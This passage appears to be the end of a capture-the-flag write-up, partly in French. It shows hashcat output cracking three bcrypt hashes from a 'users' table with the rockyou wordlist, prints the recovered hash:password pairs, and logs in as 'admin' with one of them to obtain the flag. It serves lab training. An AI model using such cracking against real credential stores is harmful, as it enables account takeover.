* Device #2: cpu-haswell-Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz, 2874/5812 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 131 MB

Dictionary cache built:
* Filename..: rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe:cutest
$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi:username
$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6:myprecious

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: users
Time.Started.....: Tue Dec  9 18:06:01 2025 (1 min, 57 secs)
Time.Estimated...: Tue Dec  9 18:07:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      808 H/s (8.73ms) @ Accel:1 Loops:16 Thr:16 Vec:1
Speed.#2.........:       77 H/s (12.07ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Speed.#*.........:      886 H/s
Recovered........: 3/3 (100.00%) Digests (total), 3/3 (100.00%) Digests (new), 3/3 (100.00%) Salts
Progress.........: 204064/43033152 (0.47%)
Rejected.........: 0/204064 (0.00%)
Restore.Point....: 67200/14344384 (0.47%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:1008-1024
Restore.Sub.#2...: Salt:1 Amplifier:0-1 Iteration:544-560
Candidate.Engine.: Device Generator
Candidates.#1....: s12345678 -> loreley
Candidates.#2....: lopez123 -> koichi
Hardware.Mon.#1..: Temp: 84c Util: 97% Core:1845MHz Mem:5500MHz Bus:16
Hardware.Mon.#2..: Util: 78%

Started: Tue Dec  9 18:05:08 2025
Stopped: Tue Dec  9 18:08:00 2025

```

## 6. Obtention du flag

Tentaive de connexion avec user : `admin` et password : `myprecious` depuis le client

Clearance to : Poly{t3rm1n4l_p4ssH4c4t_cr4ck1ng}
![Alt text](./image/flag.png)

## Conclusion
